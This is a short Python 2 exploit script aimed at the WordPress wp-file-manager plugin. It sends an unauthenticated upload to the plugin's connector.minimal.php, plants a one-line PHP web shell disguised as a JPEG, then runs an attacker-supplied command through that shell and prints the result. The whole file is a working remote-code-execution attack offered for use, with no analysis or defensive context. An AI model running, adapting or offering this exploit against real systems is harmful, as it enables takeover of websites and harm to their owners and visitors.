import requests
import sys
import re

url = "http://192.168.43.44/wordpress"
url = sys.argv[1]
url_dir = "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
vuln_url = url + url_dir

print "\n\nExample: python wordpress_filemanager.py url cmd\n"
print ">>>Vuln Url=%s" % vuln_url
cmd = sys.argv[2]
#cmd = "whoami"
files = {
  "upload[]" : ("isvuln.php", "<?php system($_POST['cmd']);?>", "image/jpeg")
}

payload = {"cmd":"upload","target":"l1_Lw=="}
proxies = {"http": "http://127.0.0.1:8080","https": "http://127.0.0.1:8080"}
headers = {
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
    'Connection': "close",
    'Accept': "*/*",
    'Cache-Control': "no-cache"
    }

response = requests.post(vuln_url, data=payload, files = files, headers=headers, proxies=proxies)
#print(response.text)
if  "isvuln" in response.text :
    shell_url = url + "/wp-content/plugins/wp-file-manager/lib/files/isvuln.php"
    data = {"cmd":cmd}
    re = requests.post(shell_url, data=data)
    print re.content
      
else:
    print "No Vuln Exit!"